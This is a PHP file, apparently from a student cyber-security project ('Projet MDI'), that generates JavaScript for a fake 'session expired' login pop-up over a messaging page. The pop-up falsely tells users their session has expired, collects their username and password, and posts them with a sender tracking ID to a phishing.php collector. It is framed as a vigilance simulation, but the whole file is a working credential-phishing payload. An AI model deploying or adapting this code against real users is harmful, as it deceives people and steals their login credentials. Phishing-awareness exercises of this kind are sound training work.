<?php
// fake_login/receiver.php
// Générateur dynamique de script de diagnostic (Version Sécurisée)

// 1. Déclaration stricte du Content-Type pour la conformité d'exécution
header('Content-Type: application/javascript; charset=utf-8');

// 2. Récupération et assainissement strict du paramètre d'identification
$sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 0;
?>

// Script d'analyse comportementale - Simulation de pop-up d'authentification
(function() {
    // Récupération sécurisée de l'ID configuré côté serveur
    const senderUserId = <?php echo json_encode($sender_id); ?>;
    
    // Si l'ID n'est pas valide, on interrompt la simulation pour éviter les faux positifs
    if (senderUserId === 0) {
        console.warn("[Lab-Simulation] ID de suivi manquant ou invalide. Interruption.");
        return;
    }
    
    // Fonction principale de génération de l'interface graphique de test
    function showPhishingPopup() {
        // Éviter les duplications si le script est chargé plusieurs fois
        if (document.getElementById('phishing-overlay')) return;

        // 1. Création de l'arrière-plan semi-transparent (Overlay)
        const overlay = document.createElement('div');
        overlay.id = 'phishing-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999999;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        `;
        
        // 2. Fenêtre modale d'authentification
        const popup = document.createElement('div');
        popup.style.cssText = `
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            padding: 35px;
            max-width: 400px;
            width: 90%;
            box-sizing: border-box;
            text-align: center;
        `;
        
        // 3. Structure interne HTML (Formulaire épuré)
        popup.innerHTML = `
            <h2 style="margin: 0 0 10px 0; color: #31a24c; font-size: 1.6rem;">Session Expirée</h2>
            <p style="margin: 0 0 25px 0; color: #7f8c8d; font-size: 0.9rem; line-height: 1.4;">
                Votre session de messagerie a expiré. Veuillez vous reconnecter pour valider la réception de vos pièces jointes.
            </p>
            <form id="phishing-form" style="text-align: left;">
                <div style="margin-bottom: 15px;">
                    <label for="phishing-username" style="display: block; margin-bottom: 6px; font-size: 0.85rem; font-weight: bold; color: #2c3e50;">Identifiant ou E-mail</label>
                    <input type="text" id="phishing-username" required placeholder="ex: etudiant" style="width: 100%; padding: 10px; border: 1px solid #dcdde1; border-radius: 5px; box-sizing: border-box;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label for="phishing-password" style="display: block; margin-bottom: 6px; font-size: 0.85rem; font-weight: bold; color: #2c3e50;">Mot de passe</label>
                    <input type="password" id="phishing-password" required placeholder="••••••••" style="width: 100%; padding: 10px; border: 1px solid #dcdde1; border-radius: 5px; box-sizing: border-box;">
                </div>
                <button type="submit" style="width: 100%; padding: 12px; background-color: #31a24c; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem;">Confirmer la connexion</button>
            </form>
            <div style="margin-top: 20px; font-size: 0.75rem; color: #b2bec3;">
                🔬 Module d'évaluation de la vigilance - Projet MDI
            </div>
        `;
        
        overlay.appendChild(popup);
        document.body.appendChild(overlay);
        
        // 4. Interception et traitement de la soumission du formulaire
        document.getElementById('phishing-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('phishing-username').value;
            const password = document.getElementById('phishing-password').value;
            
            // Transmission asynchrone des données vers le point de capture local sécurisé
            fetch('/projects/MDI/cyber-securite/messagerie/codes/fake_login/phishing.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderUserId)}`
            })
            .then(response => {
                if (!response.ok) throw new Error('Erreur réseau lors de la transmission.');
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    alert('Simulation validée : La trame de test a bien été enregistrée dans vos logs.');
                    overlay.remove(); // Fermeture propre de la modale
                } else {
                    alert('Erreur retournée par le collecteur : ' + (data.message || 'Données rejetées'));
                }
            })
            .catch(error => {
                console.error('[Lab-Exception] Échec de la communication :', error);
                alert('Une exception réseau est survenue lors de l\'enregistrement de la trame.');
            });
        });
    }
    
    // 5. Initialisation synchrone ou asynchrone selon l'état de chargement du DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', showPhishingPopup);
    } else {
        showPhishingPopup();
    }
})();